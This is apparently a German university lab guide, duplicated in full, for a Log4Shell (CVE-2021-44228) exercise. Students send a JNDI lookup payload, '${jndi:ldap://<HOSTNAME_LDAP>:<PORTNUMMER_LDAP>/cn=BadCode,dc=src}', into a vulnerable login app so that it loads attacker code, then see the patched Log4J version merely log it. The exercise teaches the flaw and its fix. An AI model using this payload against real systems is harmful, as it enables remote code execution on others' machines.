<h1 id="√ºbungsanleitung">√úbungsanleitung</h1>
<h2 id="log4shell"><strong>Log4Shell</strong></h2>
<h3 id="allgemeines">Allgemeines</h3>
<ul>
<li><p><strong>Log4J</strong></p>
<ul>
<li>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
speichert Fehlerberichte oder Zwischenergebnisse, die als ‚ÄúLogs‚Äù
bezeichnet werden. Diese Logs k√∂nnen sp√§ter eingesehen werden, um besser
zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
Log4J l√§uft auf der freien Open Source Software der Apache Software
Foundation und gilt als Vorreiter f√ºr Login-Frameworks und wird in den
meisten Java basierten Programmen als Standard verwendet.</li>
</ul></li>
<li><p><strong>Log4Shell</strong></p>
<ul>
<li><p>Die Schwachstelle in Log4J wird als Log4Shell oder CVE-2021-44228
bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
Injektionsschwachstelle in dem Java-Logging-Framework Log4J. Ein
Angreifer k√∂nnte diese Schwachstelle nutzen und damit einzelne Programme
auf der Opferanwendung ausf√ºhren oder gar das System vollst√§ndig
√ºbernehmen. Dadurch k√∂nnte zum Beispiel weitere Schadsoftware
nachgeladen oder vertrauliche Daten aus dem System gesch√∂pft
werden.</p></li>
<li><p>Im Prinzip nutzt Log4Shell eine Schwachstelle im Java Naming and
Directory Interface (JNDI) aus. Auf dieses Interface greift das
Framework Log4J n√§mlich zu. √úber diese Schwachstelle ist es m√∂glich,
b√∂sartigen Remote-Code auf einem betroffenen System oder Anwendung
auszuf√ºhren. Der Angreifer f√ºgt manipulierte Payloads in die
Protokollnachrichten ein, die von Log4J protokolliert werden. Angreifer
k√∂nnen den Pfad zu dem b√∂sartigen Code in ihre Payloads schreiben und
Log4J interpretiert die manipulierten Nachrichten nicht als einfachen
Text, sondern als Java-Objekte. Log4J l√§dt den b√∂sartigen Schadcode √ºber
JNDI zur Laufzeit aus dem Netz nach und f√ºhrt ihn aus.</p></li>
</ul></li>
</ul>
<h3 id="komponenten">Komponenten</h3>
<ul>
<li><h3 id="angreifer">Angreifer</h3>
<ul>
<li><p><strong>LDAP-Server</strong></p>
<ul>
<li>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip
wie ein Telefonbuch: er kann Eintr√§ge von Benutzern oder
Konfigurationen, aber auch IP-Adressen von beispielsweise Datenbanken
enthalten. In diesem Versuch wird der LDAP-Server vom Angreifer
kontrolliert und ist so manipuliert, dass er der Opferanwendung einen
Verzeichniseintrag mit Klassenname des Schadcodes und die Adresse des
HTTP-Servers zur√ºckliefert. Infolgedessen startet die
Java-Opferanwendung eine Webverbindung mit dem HTTP-Server des
Angreifers. Diese Webverbindung wird erm√∂glicht, da Java dynamisch ist
und Code aus dem Netz ziehen kann (Classloader).</li>
</ul></li>
<li><p><strong>HTTP-Server</strong></p>
<ul>
<li>Der HTTP-server nimmt Anfragen von der Anwendung entgegen und wird
ebenfalls vom Angreifer kontrolliert. Er liefert den Bytecode des
Schadcodes zur√ºck und sorgt daf√ºr, dass der Angreifer diesen Code beim
Opfer einschleust. Der HTTP-Server hostet .class-Dateien, die f√ºr eine
Remote-Code-Ausf√ºhrung verwendet werden.</li>
</ul></li>
</ul></li>
<li><h3 id="angriffsziel">Angriffsziel</h3>
<ul>
<li><p><strong>Login</strong></p>
<ul>
<li>Die Java-Anwendung Login ist ein einfaches Programm, dass man nutzen
kann, um sich einzuloggen. Die Anwendung fordert den Nutzer erst auf,
den Benutzernamen einzugeben. Anschlie√üend wird das Passwort erfordert.
Existiert der Benutzer nicht, oder das Passwort ist falsch, so wird im
Hintergrund eine Fehlermeldung mit dem Log4J-Framework geloggt. Die f√ºr
die Sicherheitsl√ºcke Log4Shell ben√∂tigte Log4J-Version (2.14.1) wird
hier verwendet.</li>
</ul></li>
</ul></li>
</ul>
<h3 id="hilfreiche-befehle">üí°Hilfreiche Befehleüí°</h3>
<pre><code>sudo &lt;eigentlicher Befehl&gt;</code></pre>
<ul>
<li>Je nach Rechtestruktur und Betriebssystem (Linux) muss man Kommandos
das Schl√ºsselwort ‚Äòsudo‚Äô davorstellen, um den Befehl auszuf√ºhren.</li>
</ul>
<pre><code>ls</code></pre>
<ul>
<li>Steht f√ºr ‚Äúlist‚Äù, zeigt den Inhalt eines Verzeichnisses an</li>
</ul>
<pre><code>cd</code></pre>
<ul>
<li>Steht f√ºr ‚Äúchange directory‚Äù, zu deutsch ‚ÄúVerzeichnis wechseln‚Äù</li>
<li>cd .. -&gt; wechselt bspw. in das √ºbergeordnete Verzeichnis</li>
</ul>
<pre><code>cat</code></pre>
<ul>
<li>Kann dazu genutzt werden um den Inhalt einer Datei auszugeben</li>
</ul>
<h1 id="star-start">:star: Start</h1>
<h2 style="color:red">
<ol type="1">
<li>Part: Log4Shell-Angriff mit Sicherheitsl√ºcke
</h2></li>
</ol>
<p>In diesem Versuch werden Sie die verwundbare Anwendung ‚ÄòLogin‚Äô durch
eine Injektionsschwachstelle angreifen und k√∂nnen so Schadcode auf der
Anwendung ausf√ºhren lassen.</p>
<p>Beachten Sie, dass Sie die richtigen Terminals (nicht die Terminals
mit *_patched) f√ºr diesen Part verwenden.</p>
<h3 style="color:lightblue">
Schritt 1.1 - Anwendung ausprobieren
</h3>
<p>Jetzt kann die Anwendung im Terminal ‚ÄòLogin‚Äô ganz normal ausprobiert
werden. Sie k√∂nnen versuchen sich mit dem Account ‚ÄòKlaus‚Äô &amp; Passwort
‚ÄòKlaus1‚Äô einzuloggen. Nun k√∂nnen Sie sich wieder ausloggen, damit das
Programm Sie wieder auffordert, sich einzuloggen. Geben Sie nun einen
falschen Namen ein, damit das Programm eine Log-Nachricht im Hintergrund
speichert.</p>
<h3 style="color:lightblue">
Schritt 1.2 - Log-File der Anwendung auslesen
</h3>
<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
werden. Im Terminal ‚ÄòLog-File‚Äô k√∂nnen Sie nun die Log-File der Anwendung
auslesen.</p>
<p>Vorerst m√ºssen Sie mit folgendem Befehl die .log-Datei innerhalb der
Verzeichnisse suchen:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span></code></pre></div>
<p>Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span></code></pre></div>
<p>Mit dem Befehl k√∂nnen Sie die Log-datei auslesen, wenn Sie sich im
richtigen Verzeichnis befinden</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;</span>name_logDatei<span class="op">&gt;</span>.log</span></code></pre></div>
<p>In der log-file sollten Sie nun die Log-Nachricht ihrer falschen
Eingabe finden. (Beweis: Anwendung nutzt Log4J-Framework).</p>
<h3 style="color:lightblue">
Schritt 1.3 - Log des HTTP-Server
</h3>
<p>In dem Terminal des HTTP-Servers werden Sie sehen, dass der
HTTP-Server auf port 8081 l√§uft. Sobald Sie nun im Schritt 1.4 den
Exploit durchf√ºhren, k√∂nnen Sie hier sehen, dass der HTTP-Server eine
HTTP-Request der Opfer-Anwendung ‚ÄòLogin‚Äô erh√§lt.</p>
<h3 style="color:lightblue">
Schritt 1.4 - Exploit
</h3>
<p>Um den Log4Shell-Angriff durchf√ºhren zu k√∂nnen, m√ºssen Sie in das
Eingabefeld (Benutzername oder Passwort) einen pr√§parierten JNDI-Befehl
eingeben.</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
<p>Falls Sie den pr√§parierten JNDI-Befehl richtig eingegeben haben,
sollte jetzt der Schadcode auf der Anwendung ausgef√ºhrt werden und Sie
sollten eine Ausgabe in Dauerschleife sehen. Der HTTP-Server sollte nun
die Nachricht ausgeben, dass eine Request der Opferanwendung angekommen
ist und eine Response an die Opferanwendung rausgeschickt wurde.</p>
<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie
innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
<h2
id="star-sie-haben-nun-das-ende-der-log4shell-√ºbung-part-1-erreicht">:star:
Sie haben nun das Ende der Log4Shell-√úbung Part 1 erreicht</h2>
<h2 style="color:red">
<ol start="2" type="1">
<li>Part: Log4Shell-Angriff ohne Sicherheitsl√ºcke (Gepatchte
Log4J-Version)
</h2></li>
</ol>
<p>Die Komponenten sind die gleichen wie im ersten Part der √úbung. Die
einzige √Ñnderung ist in der Komponente ‚ÄòLogin‚Äô. Dort wird jetzt im
zweiten Part der √úbung die Log4J-Version (2.20.0) verwendet. Diese
Log4J-Version ist die gepatchte Version und erm√∂glicht keine
JNDI-Lookups mehr. Somit schlie√üt es die Sicherheitsl√ºcke im
Log4J-Framework.</p>
<p>In Part 2 des Versuchs werden Sie versuchen, die Anwendung ‚ÄòLogin‚Äô
durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der
Anwendung ausf√ºhren zu lassen.</p>
<p>Beachten Sie, dass Sie die richtigen Terminals (_patched) f√ºr diesen
Part verwenden.</p>
<h3 style="color:lightblue">
Schritt 2.1 - Log des HTTP-Servers √∂ffnen
</h3>
<p>In dem Terminal des HTTP-Servers werden Sie sehen, dass der
HTTP-Server auf port 8082 l√§uft. Sobald Sie nun im Schritt 2.2 versuchen
den Exploit durchzuf√ºhren, k√∂nnen Sie hier sehen, dass der HTTP-Server
l√§uft, aber nie eine HTTP-Request von der Opferanwendung erhalten
wird.</p>
<h3 style="color:lightblue">
Schritt 2.2 - Exploit
</h3>
<p>Um die Anwendung auf eine Sicherheitsl√ºcke zu untersuchen, geben Sie
nun den selben pr√§parierten JNDI-Befehl wie im ersten Teil der √úbung
ein.</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
<p>Falls Sie den pr√§parierten JNDI-Befehl richtig eingegeben haben,
sollte jetzt der Schadcode NICHT auf der Anwendung ausgef√ºhrt
werden.</p>
<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie
innerhalb einer Datei in den Verzeichnissen des Versuchs. Der
LDAP-Server des Versuchs mit der gepatchen Version l√§uft auf einem
anderem Port wie der LDAP-Server im Part 1.</p>
<h3 style="color:lightblue">
Schritt 2.3 - Log-File der Anwendung auslesen
</h3>
<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
werden. Im Terminal ‚ÄòLog-File‚Äô k√∂nnen Sie nun die Log-File der Anwendung
auslesen.</p>
<p>Vorerst m√ºssen Sie mit folgendem Befehl die .log-Datei innerhalb der
Verzeichnisse suchen:</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span></code></pre></div>
<p>Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span></code></pre></div>
<p>Mit dem Befehl k√∂nnen Sie die Log-datei auslesen, wenn Sie sich im
richtigen Verzeichnis befinden</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;</span>name_logDatei<span class="op">&gt;</span>.log</span></code></pre></div>
<p>In der log-file sollte der JNDI-Lookup nur als String mitgeloggt
werden. (Beweis: Anwendung nutzt Log4J-Framework mit gepatchter
Version).</p>
<h2
id="star-sie-haben-nun-das-ende-der-log4shell-√ºbung-part-2-erreicht">:star:
Sie haben nun das Ende der Log4Shell-√úbung Part 2 erreicht</h2>
<h1 id="√ºbungsanleitung-1">√úbungsanleitung</h1>
<h2 id="log4shell-1"><strong>Log4Shell</strong></h2>
<h3 id="allgemeines-1">Allgemeines</h3>
<ul>
<li><p><strong>Log4J</strong></p>
<ul>
<li>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
speichert Fehlerberichte oder Zwischenergebnisse, die als ‚ÄúLogs‚Äù
bezeichnet werden. Diese Logs k√∂nnen sp√§ter eingesehen werden, um besser
zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
Log4J l√§uft auf der freien Open Source Software der Apache Software
Foundation und gilt als Vorreiter f√ºr Login-Frameworks und wird in den
meisten Java basierten Programmen als Standard verwendet.</li>
</ul></li>
<li><p><strong>Log4Shell</strong></p>
<ul>
<li><p>Die Schwachstelle in Log4J wird als Log4Shell oder CVE-2021-44228
bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
Injektionsschwachstelle in dem Java-Logging-Framework Log4J. Ein
Angreifer k√∂nnte diese Schwachstelle nutzen und damit einzelne Programme
auf der Opferanwendung ausf√ºhren oder gar das System vollst√§ndig
√ºbernehmen. Dadurch k√∂nnte zum Beispiel weitere Schadsoftware
nachgeladen oder vertrauliche Daten aus dem System gesch√∂pft
werden.</p></li>
<li><p>Im Prinzip nutzt Log4Shell eine Schwachstelle im Java Naming and
Directory Interface (JNDI) aus. Auf dieses Interface greift das
Framework Log4J n√§mlich zu. √úber diese Schwachstelle ist es m√∂glich,
b√∂sartigen Remote-Code auf einem betroffenen System oder Anwendung
auszuf√ºhren. Der Angreifer f√ºgt manipulierte Payloads in die
Protokollnachrichten ein, die von Log4J protokolliert werden. Angreifer
k√∂nnen den Pfad zu dem b√∂sartigen Code in ihre Payloads schreiben und
Log4J interpretiert die manipulierten Nachrichten nicht als einfachen
Text, sondern als Java-Objekte. Log4J l√§dt den b√∂sartigen Schadcode √ºber
JNDI zur Laufzeit aus dem Netz nach und f√ºhrt ihn aus.</p></li>
</ul></li>
</ul>
<h3 id="komponenten-1">Komponenten</h3>
<ul>
<li><h3 id="angreifer-1">Angreifer</h3>
<ul>
<li><p><strong>LDAP-Server</strong></p>
<ul>
<li>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip
wie ein Telefonbuch: er kann Eintr√§ge von Benutzern oder
Konfigurationen, aber auch IP-Adressen von beispielsweise Datenbanken
enthalten. In diesem Versuch wird der LDAP-Server vom Angreifer
kontrolliert und ist so manipuliert, dass er der Opferanwendung einen
Verzeichniseintrag mit Klassenname des Schadcodes und die Adresse des
HTTP-Servers zur√ºckliefert. Infolgedessen startet die
Java-Opferanwendung eine Webverbindung mit dem HTTP-Server des
Angreifers. Diese Webverbindung wird erm√∂glicht, da Java dynamisch ist
und Code aus dem Netz ziehen kann (Classloader).</li>
</ul></li>
<li><p><strong>HTTP-Server</strong></p>
<ul>
<li>Der HTTP-server nimmt Anfragen von der Anwendung entgegen und wird
ebenfalls vom Angreifer kontrolliert. Er liefert den Bytecode des
Schadcodes zur√ºck und sorgt daf√ºr, dass der Angreifer diesen Code beim
Opfer einschleust. Der HTTP-Server hostet .class-Dateien, die f√ºr eine
Remote-Code-Ausf√ºhrung verwendet werden.</li>
</ul></li>
</ul></li>
<li><h3 id="angriffsziel-1">Angriffsziel</h3>
<ul>
<li><p><strong>Login</strong></p>
<ul>
<li>Die Java-Anwendung Login ist ein einfaches Programm, dass man nutzen
kann, um sich einzuloggen. Die Anwendung fordert den Nutzer erst auf,
den Benutzernamen einzugeben. Anschlie√üend wird das Passwort erfordert.
Existiert der Benutzer nicht, oder das Passwort ist falsch, so wird im
Hintergrund eine Fehlermeldung mit dem Log4J-Framework geloggt. Die f√ºr
die Sicherheitsl√ºcke Log4Shell ben√∂tigte Log4J-Version (2.14.1) wird
hier verwendet.</li>
</ul></li>
</ul></li>
</ul>
<h3 id="hilfreiche-befehle-1">üí°Hilfreiche Befehleüí°</h3>
<pre><code>sudo &lt;eigentlicher Befehl&gt;</code></pre>
<ul>
<li>Je nach Rechtestruktur und Betriebssystem (Linux) muss man Kommandos
das Schl√ºsselwort ‚Äòsudo‚Äô davorstellen, um den Befehl auszuf√ºhren.</li>
</ul>
<pre><code>ls</code></pre>
<ul>
<li>Steht f√ºr ‚Äúlist‚Äù, zeigt den Inhalt eines Verzeichnisses an</li>
</ul>
<pre><code>cd</code></pre>
<ul>
<li>Steht f√ºr ‚Äúchange directory‚Äù, zu deutsch ‚ÄúVerzeichnis wechseln‚Äù</li>
<li>cd .. -&gt; wechselt bspw. in das √ºbergeordnete Verzeichnis</li>
</ul>
<pre><code>cat</code></pre>
<ul>
<li>Kann dazu genutzt werden um den Inhalt einer Datei auszugeben</li>
</ul>
<h1 id="star-start-1">:star: Start</h1>
<h2 style="color:red">
<ol type="1">
<li>Part: Log4Shell-Angriff mit Sicherheitsl√ºcke
</h2></li>
</ol>
<p>In diesem Versuch werden Sie die verwundbare Anwendung ‚ÄòLogin‚Äô durch
eine Injektionsschwachstelle angreifen und k√∂nnen so Schadcode auf der
Anwendung ausf√ºhren lassen.</p>
<p>Beachten Sie, dass Sie die richtigen Terminals (nicht die Terminals
mit *_patched) f√ºr diesen Part verwenden.</p>
<h3 style="color:lightblue">
Schritt 1.1 - Anwendung ausprobieren
</h3>
<p>Jetzt kann die Anwendung im Terminal ‚ÄòLogin‚Äô ganz normal ausprobiert
werden. Sie k√∂nnen versuchen sich mit dem Account ‚ÄòKlaus‚Äô &amp; Passwort
‚ÄòKlaus1‚Äô einzuloggen. Nun k√∂nnen Sie sich wieder ausloggen, damit das
Programm Sie wieder auffordert, sich einzuloggen. Geben Sie nun einen
falschen Namen ein, damit das Programm eine Log-Nachricht im Hintergrund
speichert.</p>
<h3 style="color:lightblue">
Schritt 1.2 - Log-File der Anwendung auslesen
</h3>
<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
werden. Im Terminal ‚ÄòLog-File‚Äô k√∂nnen Sie nun die Log-File der Anwendung
auslesen.</p>
<p>Vorerst m√ºssen Sie mit folgendem Befehl die .log-Datei innerhalb der
Verzeichnisse suchen:</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span></code></pre></div>
<p>Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span></code></pre></div>
<p>Mit dem Befehl k√∂nnen Sie die Log-datei auslesen, wenn Sie sich im
richtigen Verzeichnis befinden</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;</span>name_logDatei<span class="op">&gt;</span>.log</span></code></pre></div>
<p>In der log-file sollten Sie nun die Log-Nachricht ihrer falschen
Eingabe finden. (Beweis: Anwendung nutzt Log4J-Framework).</p>
<h3 style="color:lightblue">
Schritt 1.3 - Log des HTTP-Server
</h3>
<p>In dem Terminal des HTTP-Servers werden Sie sehen, dass der
HTTP-Server auf port 8081 l√§uft. Sobald Sie nun im Schritt 1.4 den
Exploit durchf√ºhren, k√∂nnen Sie hier sehen, dass der HTTP-Server eine
HTTP-Request der Opfer-Anwendung ‚ÄòLogin‚Äô erh√§lt.</p>
<h3 style="color:lightblue">
Schritt 1.4 - Exploit
</h3>
<p>Um den Log4Shell-Angriff durchf√ºhren zu k√∂nnen, m√ºssen Sie in das
Eingabefeld (Benutzername oder Passwort) einen pr√§parierten JNDI-Befehl
eingeben.</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
<p>Falls Sie den pr√§parierten JNDI-Befehl richtig eingegeben haben,
sollte jetzt der Schadcode auf der Anwendung ausgef√ºhrt werden und Sie
sollten eine Ausgabe in Dauerschleife sehen. Der HTTP-Server sollte nun
die Nachricht ausgeben, dass eine Request der Opferanwendung angekommen
ist und eine Response an die Opferanwendung rausgeschickt wurde.</p>
<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie
innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
<h2
id="star-sie-haben-nun-das-ende-der-log4shell-√ºbung-part-1-erreicht-1">:star:
Sie haben nun das Ende der Log4Shell-√úbung Part 1 erreicht</h2>
<h2 style="color:red">
<ol start="2" type="1">
<li>Part: Log4Shell-Angriff ohne Sicherheitsl√ºcke (Gepatchte
Log4J-Version)
</h2></li>
</ol>
<p>Die Komponenten sind die gleichen wie im ersten Part der √úbung. Die
einzige √Ñnderung ist in der Komponente ‚ÄòLogin‚Äô. Dort wird jetzt im
zweiten Part der √úbung die Log4J-Version (2.20.0) verwendet. Diese
Log4J-Version ist die gepatchte Version und erm√∂glicht keine
JNDI-Lookups mehr. Somit schlie√üt es die Sicherheitsl√ºcke im
Log4J-Framework.</p>
<p>In Part 2 des Versuchs werden Sie versuchen, die Anwendung ‚ÄòLogin‚Äô
durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der
Anwendung ausf√ºhren zu lassen.</p>
<p>Beachten Sie, dass Sie die richtigen Terminals (_patched) f√ºr diesen
Part verwenden.</p>
<h3 style="color:lightblue">
Schritt 2.1 - Log des HTTP-Servers √∂ffnen
</h3>
<p>In dem Terminal des HTTP-Servers werden Sie sehen, dass der
HTTP-Server auf port 8082 l√§uft. Sobald Sie nun im Schritt 2.2 versuchen
den Exploit durchzuf√ºhren, k√∂nnen Sie hier sehen, dass der HTTP-Server
l√§uft, aber nie eine HTTP-Request von der Opferanwendung erhalten
wird.</p>
<h3 style="color:lightblue">
Schritt 2.2 - Exploit
</h3>
<p>Um die Anwendung auf eine Sicherheitsl√ºcke zu untersuchen, geben Sie
nun den selben pr√§parierten JNDI-Befehl wie im ersten Teil der √úbung
ein.</p>
<div class="sourceCode" id="cb21"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
<p>Falls Sie den pr√§parierten JNDI-Befehl richtig eingegeben haben,
sollte jetzt der Schadcode NICHT auf der Anwendung ausgef√ºhrt
werden.</p>
<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie
innerhalb einer Datei in den Verzeichnissen des Versuchs. Der
LDAP-Server des Versuchs mit der gepatchen Version l√§uft auf einem
anderem Port wie der LDAP-Server im Part 1.</p>
<h3 style="color:lightblue">
Schritt 2.3 - Log-File der Anwendung auslesen
</h3>
<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
werden. Im Terminal ‚ÄòLog-File‚Äô k√∂nnen Sie nun die Log-File der Anwendung
auslesen.</p>
<p>Vorerst m√ºssen Sie mit folgendem Befehl die .log-Datei innerhalb der
Verzeichnisse suchen:</p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span></code></pre></div>
<p>Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:</p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span></span></code></pre></div>
<p>Mit dem Befehl k√∂nnen Sie die Log-datei auslesen, wenn Sie sich im
richtigen Verzeichnis befinden</p>
<div class="sourceCode" id="cb24"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;</span>name_logDatei<span class="op">&gt;</span>.log</span></code></pre></div>
<p>In der log-file sollte der JNDI-Lookup nur als String mitgeloggt
werden. (Beweis: Anwendung nutzt Log4J-Framework mit gepatchter
Version).</p>
<h2
id="star-sie-haben-nun-das-ende-der-log4shell-√ºbung-part-2-erreicht-1">:star:
Sie haben nun das Ende der Log4Shell-√úbung Part 2 erreicht</h2>
